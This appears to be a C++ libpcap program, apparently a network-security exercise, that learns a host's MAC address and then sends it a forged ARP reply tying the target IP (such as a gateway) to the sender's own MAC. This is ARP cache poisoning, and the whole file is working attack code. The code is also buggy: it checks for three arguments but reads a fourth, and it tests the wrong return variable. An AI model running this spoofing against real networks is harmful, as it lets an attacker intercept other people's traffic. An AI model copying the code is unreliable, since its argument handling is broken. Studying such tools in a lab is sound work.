#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <string.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>


#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

typedef struct libnet_ethernet_hdr{
   u_int8_t dstmac[6];
   u_int8_t srcmac[6];
   u_int16_t type;
}Ethernet_Header;

void usage() {
	printf("syntac : send-arp <interface> <sender ip> <target ip> \n");
	printf("sample : send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

typedef struct arp_header{
	u_int16_t Hardware_addrtype;
	u_int16_t protocol_type;
	u_int8_t Hardware_addrlength;
	u_int8_t protocol_length;
	u_int16_t operation;
	u_int8_t s_mac[6];
	u_int8_t s_ip[4];
	u_int8_t t_mac[6];
	u_int8_t t_ip[4];

}Arp_Header;

void get_mac_ip(char* dev, char MAC_str[18], char my_ip[40])
{
    #define HWADDR_len 6
    int s,i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, dev);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    for (i=0; i<HWADDR_len; i++)
        sprintf(&MAC_str[i*3],"%02X:",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
    MAC_str[17]='\0';
	ioctl(s, SIOCGIFADDR, &ifr);
	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,my_ip,sizeof(struct sockaddr));
    close(s);
}

bool chk_Ethernet_Header(const u_char* packet){
	Ethernet_Header *Header;
	Header = (Ethernet_Header*)packet;

	if(Header->type == 0x0608){
		printf("get Arp packet\n");
		return true;
	}
	return false;
}

bool chk_Arp_Reply(const u_char* packet){
	Arp_Header *Header;
	Header = (Arp_Header*)packet;
	if(Header->operation == 0x0200){
		printf("get Arp Reply\n");
		return true;
	}
	return false;
}

void get_Sender_Mac(const u_char* packet, char sender_mac[18]){
	Arp_Header *Header;
	Header = (Arp_Header*)packet;
	for(int i=0; i<6;i++){
		sprintf(&sender_mac[i*3], "%02X:",Header->s_mac[i]);
	}
	sender_mac[17] = '\0';
}

int main(int argc, char* argv[]) {
	if (argc != 3) {
		usage();
		return -1;
	}

	char my_mac[18];
	char my_ip[40]; //not necessary?
	char sender_mac[18];
	get_mac_ip(argv[1], my_mac, my_ip);


	printf("my mac: %s\n", my_mac);
	printf("my ip : %s\n", my_ip);

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(my_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac);
	packet.arp_.sip_ = htonl(Ip(my_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(argv[2]));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	while(true){
		struct pcap_pkthdr* header;
		const u_char* packet1;
		int res1 = pcap_next_ex(handle, &header, &packet1);
		if(res1 == 0) continue;
		if(res1 == -1 || res==-2){
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		if(chk_Ethernet_Header(packet1)){
			packet1 += 14;
			if(chk_Arp_Reply(packet1)){
				get_Sender_Mac(packet1, sender_mac);
				break;
			}
		}
	}
	printf("Sender Mac: %s\n",sender_mac);

	EthArpPacket packet2;

	packet2.eth_.dmac_ = Mac(sender_mac);
	packet2.eth_.smac_ = Mac(my_mac);
	packet2.eth_.type_ = htons(EthHdr::Arp);

	packet2.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet2.arp_.pro_ = htons(EthHdr::Ip4);
	packet2.arp_.hln_ = Mac::SIZE;
	packet2.arp_.pln_ = Ip::SIZE;
	packet2.arp_.op_ = htons(ArpHdr::Reply);
	packet2.arp_.smac_ = Mac(my_mac);
	packet2.arp_.sip_ = htonl(Ip(argv[3]));
	packet2.arp_.tmac_ = Mac(sender_mac);
	packet2.arp_.tip_ = htonl(Ip(argv[2]));

	int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet2), sizeof(EthArpPacket));
	if (res2 != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
	}


	pcap_close(handle);
}
